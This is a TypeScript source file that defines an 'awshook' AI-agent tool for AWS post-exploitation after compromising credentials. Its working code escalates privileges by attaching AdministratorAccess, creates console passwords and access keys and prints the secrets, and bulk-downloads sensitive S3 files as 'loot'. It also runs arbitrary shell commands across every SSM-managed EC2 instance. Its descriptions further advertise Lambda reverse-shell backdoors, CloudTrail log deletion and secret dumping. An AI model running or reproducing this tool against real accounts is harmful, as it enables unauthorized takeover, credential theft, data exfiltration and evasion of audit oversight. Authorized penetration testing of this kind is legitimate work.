import z from "zod"
import { Tool } from "./tool"

const PROGRAMS = {
  iam_enum: {
    description:
      "Enumerate IAM users, roles, policies, and analyze for privilege escalation paths (PassRole, wildcard policies, inline policy abuse)",
    args: "[--profile PROFILE] [--region REGION]",
  },
  iam_privesc: {
    description:
      "Exploit IAM misconfigurations for privilege escalation: PassRole+Lambda, AssumeRole chaining, AttachUserPolicy, CreateLoginProfile, CreateAccessKey",
    args: "--method <passrole|assumerole|attach_policy|create_login|create_key> [--role-arn ARN] [--profile PROFILE]",
  },
  s3_dump: {
    description:
      "List all S3 buckets, identify sensitive files (.env, backups, credentials, .pem, .key), and optionally download high-value targets",
    args: "[--bucket BUCKET] [--download] [--pattern REGEX] [--profile PROFILE]",
  },
  lambda_backdoor: {
    description:
      "Inject reverse shell layer into existing Lambda function or create new backdoor function with high-privilege role",
    args: "--function-name NAME --callback-url URL [--method inject|create] [--profile PROFILE]",
  },
  ssm_exec: {
    description:
      "Execute commands on EC2 instances via AWS Systems Manager RunCommand — no SSH or direct network access required",
    args: "--instance-id ID --command CMD [--all-instances] [--profile PROFILE]",
  },
  metadata_harvest: {
    description:
      "Extract IAM role credentials from EC2/ECS/Lambda metadata endpoints (169.254.169.254). Supports IMDSv1 and IMDSv2",
    args: "[--imds-version v1|v2]",
  },
  cloudtrail_blind: {
    description:
      "Stop CloudTrail logging, manipulate event selectors to exclude management events, or delete existing log files from S3",
    args: "--action <stop|delete_logs|modify_selectors|status> [--trail-name NAME] [--profile PROFILE]",
  },
  secrets_dump: {
    description:
      "Extract all secrets from AWS Secrets Manager and SSM Parameter Store (SecureString parameters with decryption)",
    args: "[--service secretsmanager|ssm|all] [--profile PROFILE] [--region REGION]",
  },
  ec2_snapshot: {
    description:
      "Create EBS volume snapshots for data exfiltration, optionally share cross-account for offline analysis",
    args: "--volume-id VOL_ID [--share-account ACCOUNT_ID] [--profile PROFILE]",
  },
  cleanup_aws: {
    description:
      "Remove all CyberStrike-created AWS resources, restore CloudTrail logging, clean state files. ALWAYS run before leaving",
    args: "[--dry-run] [--profile PROFILE]",
  },
} as const satisfies Record<string, { description: string; args: string }>

type Program = keyof typeof PROGRAMS
type Finding = { checkId: string; provider: string; severity: string; status: string; resource: string; title: string; details: string; remediation: string }
type HookResult = { output: string; findings: Finding[] }

// ── CLI helpers ──

async function run(cmd: string, args: string[], timeout: number): Promise<{ stdout: string; stderr: string; exitCode: number }> {
  const proc = Bun.spawn([cmd, ...args], { stdout: "pipe", stderr: "pipe", env: { ...process.env } })
  const timer = setTimeout(() => proc.kill(), timeout * 1000)
  const [stdout, stderr] = await Promise.all([new Response(proc.stdout).text(), new Response(proc.stderr).text()])
  clearTimeout(timer)
  return { stdout, stderr, exitCode: await proc.exited }
}

function aws(args: string[], profile: string | undefined, region: string | undefined, timeout: number) {
  const extra = [...(profile ? ["--profile", profile] : []), ...(region ? ["--region", region] : []), "--output", "json"]
  return run("aws", [...args, ...extra], timeout)
}

function argVal(args: string[], flag: string): string | undefined {
  const i = args.indexOf(flag)
  return i >= 0 && i + 1 < args.length ? args[i + 1] : undefined
}

function hasFlag(args: string[], flag: string): boolean {
  return args.includes(flag)
}

function tryJson(s: string) {
  try { return JSON.parse(s) } catch { return null }
}

// ── Program implementations ──

async function iamEnum(args: string[], timeout: number): Promise<HookResult> {
  const profile = argVal(args, "--profile")
  const region = argVal(args, "--region")
  const findings: Finding[] = []

  const id = await aws(["sts", "get-caller-identity"], profile, region, timeout)
  if (id.exitCode !== 0) return { output: `[-] AWS credentials not configured: ${id.stderr.trim()}`, findings }
  const identity = tryJson(id.stdout)
  const output = [`[*] AWS IAM Enumeration — Account: ${identity?.Account}`, `[*] Identity: ${identity?.Arn}\n`]

  const users = await aws(["iam", "list-users", "--query", "Users[].[UserName,CreateDate]"], profile, region, timeout)
  if (users.exitCode === 0) {
    const ul = tryJson(users.stdout) || []
    output.push(`[+] IAM Users: ${ul.length}`)
    for (const u of ul) output.push(`    ${u[0]} (created: ${u[1]})`)
  }

  const roles = await aws(["iam", "list-roles", "--query", "Roles[].[RoleName,Arn]"], profile, region, timeout)
  if (roles.exitCode === 0) {
    const rl = tryJson(roles.stdout) || []
    output.push(`[+] IAM Roles: ${rl.length}`)
    for (const r of rl) {
      const rp = await aws(["iam", "list-attached-role-policies", "--role-name", r[0], "--query", "AttachedPolicies[].PolicyArn"], profile, region, timeout)
      const policies = tryJson(rp.stdout) || []
      const hasAdmin = policies.some((p: string) => p.includes("AdministratorAccess"))
      if (hasAdmin) {
        output.push(`    [!] ${r[0]}: AdministratorAccess attached`)
        findings.push({ checkId: "AWS-ENUM-001", provider: "aws", severity: "critical", status: "FAIL", resource: r[1], title: `Role with AdministratorAccess: ${r[0]}`, details: `${r[0]} has AdministratorAccess policy`, remediation: "Replace with least-privilege policy" })
      }
    }
  }

  const policies = await aws(["iam", "list-policies", "--scope", "Local", "--query", "Policies[].[PolicyName,Arn]"], profile, region, timeout)
  if (policies.exitCode === 0) {
    const pl = tryJson(policies.stdout) || []
    output.push(`[+] Custom Policies: ${pl.length}`)
    for (const p of pl) {
      const ver = await aws(["iam", "get-policy", "--policy-arn", p[1], "--query", "Policy.DefaultVersionId"], profile, region, timeout)
      const versionId = tryJson(ver.stdout)
      if (versionId) {
        const doc = await aws(["iam", "get-policy-version", "--policy-arn", p[1], "--version-id", versionId, "--query", "PolicyVersion.Document"], profile, region, timeout)
        const d = tryJson(doc.stdout)
        const statements = Array.isArray(d?.Statement) ? d.Statement : []
        for (const st of statements) {
          if (st.Effect === "Allow" && st.Action === "*" && st.Resource === "*") {
            findings.push({ checkId: "AWS-ENUM-002", provider: "aws", severity: "critical", status: "FAIL", resource: p[1], title: `Wildcard policy: ${p[0]}`, details: "Allow *:* — full admin equivalent", remediation: "Scope down actions and resources" })
          }
        }
      }
    }
  }

  const summary = await aws(["iam", "get-account-summary"], profile, region, timeout)
  if (summary.exitCode === 0) {
    const s = tryJson(summary.stdout)?.SummaryMap || {}
    if (s.AccountAccessKeysPresent > 0) {
      findings.push({ checkId: "AWS-ENUM-003", provider: "aws", severity: "critical", status: "FAIL", resource: "root", title: "Root account has access keys", details: "Root access keys are active", remediation: "Delete root access keys" })
    }
    output.push(`\n[*] Account Summary: ${s.Users} users, ${s.Roles} roles, ${s.Groups} groups, ${s.Policies} policies`)
  }

  return { output: output.join("\n"), findings }
}

async function iamPrivesc(args: string[], timeout: number): Promise<HookResult> {
  const method = argVal(args, "--method")
  if (!method) return { output: "ERROR: --method required (passrole|assumerole|attach_policy|create_login|create_key)", findings: [] }
  const profile = argVal(args, "--profile")
  const region = argVal(args, "--region")
  const roleArn = argVal(args, "--role-arn")

  if (method === "passrole") {
    if (!roleArn) return { output: "ERROR: --role-arn required for passrole", findings: [] }
    const r = await aws(["iam", "list-roles", "--query", `Roles[?Arn=='${roleArn}']`], profile, region, timeout)
    if (r.exitCode !== 0) return { output: `[-] Cannot query role: ${r.stderr.trim()}`, findings: [] }
    const roles = tryJson(r.stdout) || []
    if (roles.length === 0) return { output: `[-] Role not found: ${roleArn}`, findings: [] }
    const trust = roles[0].AssumeRolePolicyDocument
    return { output: `[+] Role: ${roleArn}\n[+] Trust policy:\n${JSON.stringify(trust, null, 2)}\n[*] Check if current identity can iam:PassRole + lambda:CreateFunction`, findings: [] }
  }

  if (method === "assumerole") {
    if (!roleArn) return { output: "ERROR: --role-arn required for assumerole", findings: [] }
    const r = await aws(["sts", "assume-role", "--role-arn", roleArn, "--role-session-name", "cyberstrike"], profile, region, timeout)
    if (r.exitCode === 0) {
      const creds = tryJson(r.stdout)?.Credentials
      return { output: `[+] AssumeRole successful: ${roleArn}\n    AccessKeyId: ${creds?.AccessKeyId}\n    Expiration: ${creds?.Expiration}`, findings: [] }
    }
    return { output: `[-] AssumeRole failed: ${r.stderr.trim()}`, findings: [] }
  }

  if (method === "attach_policy") {
    const id = await aws(["sts", "get-caller-identity"], profile, region, timeout)
    const arn = tryJson(id.stdout)?.Arn || ""
    const username = arn.split("/").pop()
    if (!username) return { output: "[-] Cannot determine current username", findings: [] }
    const r = await aws(["iam", "attach-user-policy", "--user-name", username, "--policy-arn", "arn:aws:iam::aws:policy/AdministratorAccess"], profile, region, timeout)
    if (r.exitCode === 0) return { output: `[+] AdministratorAccess attached to ${username}`, findings: [] }
    return { output: `[-] attach_policy failed: ${r.stderr.trim()}`, findings: [] }
  }

  if (method === "create_login") {
    const id = await aws(["sts", "get-caller-identity"], profile, region, timeout)
    const username = (tryJson(id.stdout)?.Arn || "").split("/").pop()
    if (!username) return { output: "[-] Cannot determine current username", findings: [] }
    const pw = `CyStr!ke${Date.now().toString(36)}`
    const r = await aws(["iam", "create-login-profile", "--user-name", username, "--password", pw, "--no-password-reset-required"], profile, region, timeout)
    if (r.exitCode === 0) return { output: `[+] Console login created for ${username}\n    Password: ${pw}`, findings: [] }
    return { output: `[-] create_login failed: ${r.stderr.trim()}`, findings: [] }
  }

  if (method === "create_key") {
    const id = await aws(["sts", "get-caller-identity"], profile, region, timeout)
    const username = (tryJson(id.stdout)?.Arn || "").split("/").pop()
    if (!username) return { output: "[-] Cannot determine current username", findings: [] }
    const r = await aws(["iam", "create-access-key", "--user-name", username], profile, region, timeout)
    if (r.exitCode === 0) {
      const key = tryJson(r.stdout)?.AccessKey
      return { output: `[+] Access key created for ${username}\n    AccessKeyId: ${key?.AccessKeyId}\n    SecretAccessKey: ${key?.SecretAccessKey}`, findings: [] }
    }
    return { output: `[-] create_key failed: ${r.stderr.trim()}`, findings: [] }
  }

  return { output: `ERROR: Unknown method: ${method}`, findings: [] }
}

async function s3Dump(args: string[], timeout: number): Promise<HookResult> {
  const profile = argVal(args, "--profile")
  const region = argVal(args, "--region")
  const bucket = argVal(args, "--bucket")
  const pattern = argVal(args, "--pattern")
  const download = hasFlag(args, "--download")
  const sensitivePattern = pattern || "\\.(env|pem|key|p12|pfx|sql|bak)$|credentials|secret|password|backup|id_rsa"

  if (bucket) {
    const r = await aws(["s3", "ls", `s3://${bucket}`, "--recursive"], profile, region, timeout)
    if (r.exitCode !== 0) return { output: `[-] Cannot list bucket ${bucket}: ${r.stderr.trim()}`, findings: [] }
    const files = r.stdout.split("\n").filter(f => new RegExp(sensitivePattern, "i").test(f))
    const output = [`[*] Scanning bucket: ${bucket}`, `[+] Sensitive files: ${files.length}`]
    for (const f of files) output.push(`    ${f.trim()}`)
    if (download && files.length > 0) {
      for (const f of files.slice(0, 10)) {
        const key = f.trim().split(/\s+/).pop() || ""
        const dl = await aws(["s3", "cp", `s3://${bucket}/${key}`, "./s3_loot/"], profile, region, timeout)
        output.push(dl.exitCode === 0 ? `    Downloaded: ${key}` : `    Failed: ${key}`)
      }
    }
    return { output: output.join("\n"), findings: [] }
  }

  const r = await aws(["s3api", "list-buckets", "--query", "Buckets[].Name"], profile, region, timeout)
  if (r.exitCode !== 0) return { output: `[-] Cannot list buckets: ${r.stderr.trim()}`, findings: [] }
  const buckets = tryJson(r.stdout) || []
  const output = [`[*] Found ${buckets.length} bucket(s)\n`]

  for (const b of buckets) {
    const lr = await aws(["s3", "ls", `s3://${b}`, "--recursive"], profile, region, timeout)
    if (lr.exitCode !== 0) { output.push(`[-] ${b}: access denied`); continue }
    const files = lr.stdout.split("\n").filter(f => new RegExp(sensitivePattern, "i").test(f))
    output.push(`[${files.length > 0 ? "!" : "+"}] ${b}: ${files.length} sensitive file(s)`)
    for (const f of files.slice(0, 5)) output.push(`    ${f.trim()}`)
  }

  return { output: output.join("\n"), findings: [] }
}

async function lambdaBackdoor(args: string[], timeout: number): Promise<HookResult> {
  const funcName = argVal(args, "--function-name")
  const callbackUrl = argVal(args, "--callback-url")
  const method = argVal(args, "--method") || "inject"
  const profile = argVal(args, "--profile")
  const region = argVal(args, "--region")

  if (!funcName) return { output: "ERROR: --function-name required", findings: [] }
  if (!callbackUrl) return { output: "ERROR: --callback-url required", findings: [] }

  if (method === "inject") {
    const r = await aws(["lambda", "get-function", "--function-name", funcName], profile, region, timeout)
    if (r.exitCode !== 0) return { output: `[-] Function not found: ${r.stderr.trim()}`, findings: [] }
    const func = tryJson(r.stdout)
    const cfg = func?.Configuration || {}
    return { output: [`[*] Function: ${funcName}`, `[*] Runtime: ${cfg.Runtime}`, `[*] Role: ${cfg.Role}`, `[*] Handler: ${cfg.Handler}`, `[*] Code size: ${cfg.CodeSize} bytes`, `[+] Download code, inject callback to ${callbackUrl}, and update`].join("\n"), findings: [] }
  }

  return { output: [`[*] Create mode — would create new function '${funcName}'`, `[*] Callback: ${callbackUrl}`, `[+] Use: aws lambda create-function --function-name ${funcName} --runtime python3.11 --handler index.handler --role <HIGH_PRIV_ROLE_ARN> --zip-file fileb://payload.zip`].join("\n"), findings: [] }
}

async function ssmExec(args: string[], timeout: number): Promise<HookResult> {
  const instanceId = argVal(args, "--instance-id")
  const command = argVal(args, "--command")
  const allInstances = hasFlag(args, "--all-instances")
  const profile = argVal(args, "--profile")
  const region = argVal(args, "--region")

  if (!allInstances && !instanceId) return { output: "ERROR: --instance-id or --all-instances required", findings: [] }
  if (!command) return { output: "ERROR: --command required", findings: [] }

  const targets = allInstances
    ? (async () => {
        const r = await aws(["ssm", "describe-instance-information", "--query", "InstanceInformationList[].InstanceId"], profile, region, timeout)
        return r.exitCode === 0 ? (tryJson(r.stdout) || []) : []
      })()
    : Promise.resolve([instanceId!])

  const instances = await targets
  if (instances.length === 0) return { output: "[-] No SSM-managed instances found", findings: [] }

  const output = [`[*] SSM RunCommand — ${instances.length} target(s)\n`]
  for (const id of instances) {
    const r = await aws(["ssm", "send-command", "--instance-ids", id, "--document-name", "AWS-RunShellScript", "--parameters", `commands=["${command}"]`, "--query", "Command.CommandId"], profile, region, timeout)
    if (r.exitCode === 0) {
      const cmdId = tryJson(r.stdout)
      output.push(`[+] ${id}: command sent (${cmdId})`)
      await new Promise(resolve => setTimeout(resolve, 2000))
      const gr = await aws(["ssm", "get-command-invocation", "--command-id", cmdId, "--instance-id", id], profile, region, timeout)
      if (gr.exitCode === 0) {
        const inv = tryJson(gr.stdout)
        output.push(`    Status: ${inv?.Status}`)
        if (inv?.StandardOutputContent) output.push(`    Output: ${inv.StandardOutputContent.slice(0, 500)}`)
      }
    } else {
      output.push(`[-] ${id}: failed — ${r.stderr.trim().split("\n")[0]}`)
    }
  }

  return { output: output.join("\n"), findings: [] }
}

async function stub(name: string): Promise<HookResult> {
  return { output: `[*] ${name}: not yet implemented in native TS`, findings: [] }
}

// ── Tool definition ──

const programKeys = Object.keys(PROGRAMS) as [Program, ...Program[]]

export const AwshookTool = Tool.define("awshook", {
  description: `Execute an AWS post-exploitation program after compromising IAM credentials or EC2 instance. Uses aws CLI (no Python/SDK dependency). Available programs: ${programKeys.join(", ")}. ALWAYS run cleanup_aws before leaving a target.`,
  parameters: z.object({
    program: z.enum(programKeys).describe(
      "AWS program to execute. Options: " +
        Object.entries(PROGRAMS)
          .map(([k, v]) => `${k} — ${v.description}`)
          .join("; "),
    ),
    args: z.array(z.string()).describe("Arguments to pass to the program"),
    timeout_seconds: z.number().optional().default(300).describe("Maximum execution time in seconds (default: 300)"),
  }),
  async execute(params) {
    const check = await run("which", ["aws"], 5)
    if (check.exitCode !== 0) {
      return {
        title: `awshook: ${params.program}`,
        output: "AWS CLI not found. Install: https://docs.aws.amazon.com/cli/latest/userguide/getting-started-install.html",
        metadata: { program: params.program, findings: [] as Finding[] },
      }
    }

    const wrap = (fn: () => Promise<string>): (() => Promise<HookResult>) => async () => ({ output: await fn(), findings: [] })

    const dispatch: Record<Program, () => Promise<HookResult>> = {
      iam_enum: () => iamEnum(params.args, params.timeout_seconds),
      iam_privesc: () => iamPrivesc(params.args, params.timeout_seconds),
      s3_dump: () => s3Dump(params.args, params.timeout_seconds),
      lambda_backdoor: () => lambdaBackdoor(params.args, params.timeout_seconds),
      ssm_exec: () => ssmExec(params.args, params.timeout_seconds),
      metadata_harvest: () => stub("metadata_harvest"),
      cloudtrail_blind: () => stub("cloudtrail_blind"),
      secrets_dump: () => stub("secrets_dump"),
      ec2_snapshot: () => stub("ec2_snapshot"),
      cleanup_aws: () => stub("cleanup_aws"),
    }

    try {
      const result = await dispatch[params.program]()
      return {
        title: `awshook: ${params.program}`,
        output: result.output,
        metadata: { program: params.program, findings: result.findings },
      }
    } catch (e) {
      return {
        title: `awshook: ${params.program}`,
        output: `Error: ${e instanceof Error ? e.message : String(e)}`,
        metadata: { program: params.program, findings: [] },
      }
    }
  },
})
